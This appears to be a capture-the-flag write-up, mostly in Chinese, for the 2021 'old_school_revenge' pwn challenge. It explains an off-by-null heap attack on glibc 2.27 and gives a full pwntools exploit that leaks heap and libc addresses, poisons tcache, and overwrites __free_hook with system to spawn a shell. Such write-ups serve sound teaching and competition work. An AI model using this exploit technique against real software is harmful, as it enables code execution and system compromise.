# 第四届“强网”拟态防御国际精英挑战赛 2021 pwn **old_school_revenge**

> challenge name: `old_school`
>
> file: `old_school_revenge`, libc-2.27.so
>
> .i64 with comments provided
>
> writeup writer: hexhex16@outlook.com    https://github.com/kokifish thanks liwl
>
> 是这场比赛另一题`old_school`的进阶版，`old_school`是Off-By-One，这题是Off-By-Null

Off-By-Null相比于Off-By-One的区别：只能修改下一chunk的size域的最低1字节为0，而不能修改为任意数字。所以在Off-By-One中使用的增大unsorted bin中chunk的size的方法不再适用。

采用的方法：在一个chunk c0中，伪造一个chunk头部（改size(inuse=1)，fw, bk指向自身，改下一chunk的`prev_size`），触发OffByNull把后一chunk的inuse改为0；然后把后面一个chunk释放到unsorted bin中，会触发unlink的merge，将fake chunk合并，即把fake chunk顺进unsorted bin中；然后再把fake chunk拿回来，再把fake chunk释放入tcache，就可以通过c0改tcache中chunk的fw了

```python
c0(0x30)  # 在这里构造一个fake chunk，fw bk指向自身，同时改c1的prev_size
c1(0x100) # 后续利用c0触发OffByNull，改inuse位为0，释放时将fake chunk合并，一同放入unsorted bin
```

重点在于，将一个chunk free进unsorted bin时，触发chunk的合并，把一个原本还在使用中的chunk的一部分带入unsorted bin中。

# Theory and Security Check

- free chunk时，如果该chunk无法进入tcache或者fastbin时（单链），用下一chunk的`prev_inuse`判断该chunk是否空闲，如果`prev_inuse=0`表示该chunk空闲，则free一个空闲chunk，出错

```python
c0
c1 # prev_inuse=1, size=0x20, 
c2 # prev_inuse=0, prev_size=0x20 # 以下案例将讨论 free(c2) c2进入unsorted bin的状况
c3
c4
```

free(c2)时，如果该chunk要进入unsorted bin，则：

1. 向前合并：判断`prev_inuse`是否为0，如果为0，则依据`prev_size`判断前一chunk c1的起始位置，将c1合并，c2 c1一起放入unsorted bin。如果`c1.prev_inuse=0`，则依据`c1.prev_size`尝试合并c0。
2. 向后合并：依据`c4.prev_inuse`判断c3是否空闲，如果c3空闲则尝试向后合并。

安全检查：

- free(c2)时，可能会检查c3.size是否合法
- free(c2)时，若`c2.prev_inuse=0`，依据`c2.prev_size`找到c1起始地址后，判断`c1.size`是否与`c2.prev_size`相等
- free(c2) 尝试合并c1时，在unlink过程中，会将c1从双链表上解下，则需要满足(e.g.)`c1->fw->bk == c1` && `c1->bk->fw==c1`（这是举个最简单的例子），这里c1指`c1.prev_size`的地址



# exp

```python
from pwn import *
context.arch = 'amd64'
context.log_level = "debug"
IP = "123.60.63.39"
PORT = 49154
DEBUG = 1


if DEBUG:
    p = process(["./ld.so", "./old_school_revenge"], env={"LD_PRELOAD": "./libc-2.27.so"})
    libc = ELF("./libc-2.27.so")
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[1].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", base, p.libs())

else:  # flag{m0lWJAzDB1vzxMn9PlMQXkPvEmGAdZzB}
    p = remote(IP, PORT)
    libc = ELF("./libc-2.27.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def dd():
    if DEBUG:
        cmd = ""
        # cmd += "b *%d\n" % (base + 0xC0E)  #
        cmd += "set $a=%d\n" % (base + 0x202160)  # arrPtr
        debug(cmd)


def new(idx, size):
    sla("Your choice: ", str(1))
    sla("Index: ", str(idx))  # max: = 0x1F = 31
    sla("Size: ", str(size))  # max: = 0x100
    ru("Done!")


def edit(idx, content):
    sla("Your choice: ", str(2))
    sla("Index: ", str(idx))
    sa("Content: ", content)


def show(idx):
    sla("Your choice: ", str(3))
    sla("Index: ", str(idx))
    ru("Content: ")
    return ru("1. New note")[:-12]


def delete(idx):
    sla("Your choice: ", str(4))
    sla("Index: ", str(idx))


# Step-1: full tcache(0x100), prepare a chunk and a fake chunk that will deleted and merged to unsorted bin
new(0, 0x28)  # 0x30 # fake c0'(0x20) here
new(1, 0xf8)  # 0x100
for i in range(7):  # 0x100
    new(i + 10, 0xf8)  # 10, 11... 16
for i in range(7):
    delete(i + 10)  # 10, 11... 16

# Step-2: leak heap base addr
new(10, 0xf8)  # get a chunk in tcache
new(9, 0x18)  # avoid top chunk merge

data = show(10)  # get heap base addr
temp = u64(data.ljust(8, b"\x00"))
heap_base = temp - 0x555555f8c890 + 0x0000555555f8c000
print("data:", data, data.hex())
print("heap_base:", heap_base, hex(heap_base), hex(temp))
delete(10)  # del chunk10 to tcache head chunk

# Step-3: edit fake chunk: size, fw, bk; prev_size, OffByNull.
c1fake_addr = heap_base + 0x260  # 0x555556a66960 - 0x555556a66000
# edit fake chunk # cover prev_size=0x20 # cover size=0x101 with 0x100, means prev chunk NOT in use
edit(0, p64(0xdeadbeef) + p64(0x21) + p64(c1fake_addr) + p64(c1fake_addr) + p64(0x20))
dd()
# Step-4: delete a chunk to unsorted bin, trigger unlink, merge fake chunk
delete(1)  # to unsorted bin # trigger unlink, merge fake chunk(0x20)
# tcache(0x100)cnt=7: c10.... # unsorted bin: size=0x120

# Step-5: get fake chunk from unsorted bin, delete to tcache
new(20, 0x58)  # get fake chunk from unsorted bin
data = show(20)  # leak libc addr
temp = u64(data.ljust(8, b"\x00"))
libc.address = temp - 0x7f443a8f4db0 + 0x00007f443a509000
print("data:", data, data.hex())
print("libc.address:", hex(libc.address), hex(temp))
new(21, 0x58)
new(29, 0x18)  # avoid top chunk merge
delete(21)  # to tcache(0x60)
delete(20)  # delete fake chunk to tcache(0x60) # tcache(0x60)cnt=2: chunk20(fake chunk), chunk 21

# Step-6: edit fake chunk in tcache, then tcache poisoning
edit(0, p64(0x110) + p64(0x61) + p64(libc.symbols["__free_hook"]) + b'\n')  # cover fw with &__free_hook

new(20, 0x58)  # get chunk from tcache(0x60) # tcache(0x60)cnt=1: &__free_hook
edit(20, "/bin/sh\x00\n")
new(21, 0x58)  # get &__free_hook from tcache(0x60)
edit(21, p64(libc.symbols["system"]) + b'\n')  # cover __free_hook(NULL) with &system
delete(20)  # get shell: system("/bin/sh\x00\n")

p.interactive()

```

多调多试简称调试



- 利用chunk0编辑完fake chunk，触发OffByNull之后，chunk0的内容如下（由于有PIE ASLR，具体数值仅供参考）：

```assembly
gef➤  x /30xg 0x555556385260 -0x10 # chunk0 addr=0x555556385260
0x555556385250: 0x0000000000000000      0x0000000000000031 # chunk0 size=0x31
0x555556385260: 0x00000000deadbeef      0x0000000000000021 # fake chunk: prev_size, size(inuse=1)
0x555556385270: 0x0000555556385260      0x0000555556385260 # fake chunk: fw, bk; point to -0x10
0x555556385280: 0x0000000000000020      0x0000000000000100 # chunk1: prev_size=0x20, size(inuse=0)
0x555556385290: 0x0000000000000000      0x0000000000000000 ......
```

